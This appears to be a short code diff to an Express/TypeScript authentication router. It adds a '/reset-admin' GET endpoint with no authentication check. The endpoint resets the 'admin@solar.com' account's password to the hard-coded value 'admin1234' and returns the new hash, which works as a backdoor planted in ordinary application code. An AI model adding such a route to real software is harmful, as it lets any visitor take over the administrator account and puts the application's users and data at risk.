@@ -47,5 +47,9 @@ router.get('/me', authenticate, async (req: Request, res: Response) => {
     res.status(500).json({ error: 'Server error' });
   }
 });
-
+router.get('/reset-admin', async (_req: Request, res: Response) => {
+  const hash = await bcrypt.hash('admin1234', 12);
+  await db.query('UPDATE users SET password_hash = $1 WHERE email = $2', [hash, 'admin@solar.com']);
+  res.json({ ok: true, hash });
+});
 export default router;
